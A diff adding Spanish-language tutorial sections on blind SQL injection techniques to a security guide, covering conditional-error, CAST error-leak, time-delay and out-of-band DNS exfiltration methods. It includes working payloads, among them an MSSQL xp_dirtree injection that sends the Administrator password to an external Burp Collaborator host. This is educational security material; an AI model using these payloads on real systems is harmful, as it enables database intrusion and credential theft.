@@ -516,6 +516,165 @@ Puedes continuar este proceso para determinar sistemáticamente la contraseña c
 
 > **Nota**: La función `SUBSTRING` se llama `SUBSTR` en algunos tipos de bases de datos. Para más detalles, consulta la **SQL Injection Cheat Sheet**.
 
+### Error-based SQL Injection
+
+Error-based SQL injection se refiere a los casos en los que puedes utilizar mensajes de error para extraer o inferir datos sensibles de la base de datos, incluso en contextos ciegos. Las posibilidades dependen de la configuración de la base de datos y de los tipos de errores que puedes provocar:
+
+* Es posible inducir a la aplicación a devolver una respuesta de error específica basada en el resultado de una expresión booleana. Puedes explotar esto de la misma manera que las respuestas condicionales en inyecciones SQL ciegas.\
+  Para más información, consulta Explotando inyecciones SQL ciegas mediante errores condicionales.
+* También puedes forzar mensajes de error que muestren los datos devueltos por la consulta, convirtiendo vulnerabilidades de SQL injection ciegas en visibles.\
+  Para más información, consulta Extracción de datos sensibles a través de mensajes de error detallados.
+
+#### Explotando Blind SQL Injection por Errores Condicionales
+
+Algunas aplicaciones ejecutan consultas SQL sin cambiar su comportamiento, independientemente de si la consulta devuelve datos o no. En estos casos, la técnica de inyección basada en respuestas condicionales no funcionará.
+
+Sin embargo, es posible inducir a la aplicación a devolver una respuesta diferente si se produce un error SQL. Puedes modificar la consulta para provocar un error en la base de datos solo si se cumple una condición. Generalmente, un error no manejado generará una diferencia en la respuesta de la aplicación, como un mensaje de error, lo que te permite inferir la veracidad de la condición inyectada.
+
+Por ejemplo, supongamos que se envían dos solicitudes con los siguientes valores en la cookie `TrackingId`:
+
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+Estos inputs utilizan `CASE` para evaluar una condición y devolver una expresión distinta según el resultado:
+
+* En la primera inyección, `CASE` devuelve `'a'`, lo que no genera error.
+* En la segunda inyección, `CASE` evalúa `1/0`, lo que provoca un error de división por cero.
+
+Si el error modifica la respuesta HTTP de la aplicación, puedes determinar si la condición inyectada es verdadera.
+
+#### Extracción de Datos con Errores Condicionales
+
+Puedes extraer datos probando carácter por carácter:
+
+```sql
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+#### Extracción de Datos Sensibles vía Mensajes de Error
+
+A veces, una configuración incorrecta de la base de datos genera mensajes de error detallados que pueden ser útiles para un atacante.\
+Por ejemplo, tras inyectar una comilla simple en un parámetro `id`, la aplicación devuelve:
+
+```plaintext
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+Este mensaje muestra la consulta SQL completa generada con nuestra entrada, revelando que estamos inyectando dentro de una cadena entre comillas en una cláusula `WHERE`. Esto facilita la construcción de una consulta maliciosa válida.
+
+Algunas veces, es posible forzar a la aplicación a generar un mensaje de error que contenga parte de los datos devueltos por la consulta. Esto convierte una vulnerabilidad SQL injection ciega en una visible.
+
+#### Uso de `CAST()` para Provocar Errores
+
+La función `CAST()` permite convertir un tipo de datos a otro. Si intentas convertir un string a un tipo incompatible, como un `int`, puede generar un error como:
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+Si el dato es un string, la base de datos puede responder con:
+
+```plaintext
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+Este método es útil si un límite de caracteres impide provocar respuestas condicionales.
+
+### Exploiting Blind SQL Injection by Triggering Time Delays
+
+Si la aplicación captura los errores de la base de datos cuando se ejecuta la consulta SQL y los maneja adecuadamente, no habrá ninguna diferencia visible en la respuesta de la aplicación. Esto significa que la técnica anterior de inducción de errores condicionales no funcionará.
+
+En esta situación, es posible explotar la vulnerabilidad de blind SQL injection provocando **retrasos en el tiempo de respuesta** dependiendo de si una condición inyectada es verdadera o falsa. Como las consultas SQL se procesan normalmente de manera **síncrona**, retrasar la ejecución de una consulta SQL también **retrasará la respuesta HTTP**. Esto permite determinar la verdad de la condición inyectada basándose en el tiempo que tarda en recibirse la respuesta.
+
+#### Técnicas de Time Delay según la Base de Datos
+
+Las técnicas para provocar un retraso dependen del tipo de base de datos utilizada.\
+Por ejemplo, en **Microsoft SQL Server**, puedes usar la siguiente inyección para probar una condición y generar un retraso si la expresión es verdadera:
+
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10'--  
+'; IF (1=1) WAITFOR DELAY '0:0:10'--  
+```
+
+#### Extracción de Datos Usando Time Delay
+
+Puedes utilizar esta técnica para recuperar datos probando carácter por carácter.\
+Por ejemplo, para verificar si el primer carácter de la contraseña de `Administrator` es mayor que `'m'`:
+
+```sql
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--  
+```
+
+### Exploiting Blind SQL Injection Using Out-of-Band (OAST) Techniques
+
+En algunos casos, una aplicación puede ejecutar una consulta SQL de manera **asíncrona**, lo que significa que:
+
+* La respuesta de la aplicación **no depende** de los datos devueltos por la consulta.
+* No es posible inducir un **error visible** en la aplicación.
+* El tiempo de ejecución de la consulta **no afecta** la respuesta HTTP.
+
+A pesar de esto, la consulta aún puede ser vulnerable a **SQL injection**, y podemos explotar esta vulnerabilidad mediante **interacciones de red out-of-band (OAST)**.
+
+#### Uso de Interacciones de Red Out-of-Band
+
+Cuando no se pueden explotar respuestas condicionales o errores, una alternativa es provocar **interacciones de red out-of-band (OAST)** con un sistema bajo nuestro control.\
+Estas interacciones pueden ser activadas con una condición inyectada para inferir información paso a paso o incluso **exfiltrar datos directamente**.
+
+#### Uso de DNS para Exfiltración de Datos
+
+Diferentes protocolos de red pueden ser utilizados para este propósito, pero el más efectivo suele ser **DNS (Domain Name System)**.\
+Esto se debe a que muchas redes de producción permiten la salida libre de consultas DNS, ya que son esenciales para el funcionamiento normal del sistema.
+
+#### Herramientas para Out-of-Band SQL Injection
+
+La forma más sencilla y confiable de utilizar técnicas OAST es con **Burp Collaborator**, un servidor que proporciona implementaciones personalizadas de varios servicios de red, incluyendo **DNS**.\
+Burp Suite Professional incluye un cliente integrado que se configura automáticamente para trabajar con Burp Collaborator.
+
+Para más información, consulta la [documentación de Burp Collaborator](https://portswigger.net/burp/documentation/collaborator).
+
+#### Ejemplo: Inyección OAST en Microsoft SQL Server
+
+Para provocar una consulta DNS y confirmar que la vulnerabilidad es explotable, podemos usar la siguiente inyección:
+
+```sql
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+Esto provoca que la base de datos realice una consulta DNS al dominio generado por **Burp Collaborator**:
+
+```
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+```
+
+Burp Collaborator permite generar un **subdominio único** y monitorear si se recibe una consulta DNS, confirmando que la vulnerabilidad es explotable.
+
+#### Exfiltración de Datos con OAST
+
+Una vez confirmada la posibilidad de interacciones de red out-of-band, podemos **exfiltrar datos sensibles**.\
+Por ejemplo, para obtener la contraseña del usuario `Administrator` y enviarla mediante una consulta DNS:
+
+```sql
+'; declare @p varchar(1024);
+set @p=(SELECT password FROM users WHERE username='Administrator');
+exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+#### ¿Qué hace esta inyección?
+
+1. **Obtiene la contraseña** del usuario `Administrator`.
+2. **Concatena** la contraseña con un subdominio de Burp Collaborator.
+3. **Provoca una consulta DNS**, que incluye la contraseña en la solicitud.
+
+Por ejemplo, si la contraseña del usuario fuera `S3cure`, la base de datos generaría la siguiente consulta DNS:
+
+```
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+Burp Collaborator capturará esta solicitud, revelando la contraseña del usuario.
+
 ## Cómo Prevenir la Inyección SQL
 
 Puedes prevenir la mayoría de las instancias de inyección SQL usando consultas parametrizadas en lugar de concatenar cadenas dentro de la consulta. Estas consultas parametrizadas también se conocen como **sentencias preparadas**.
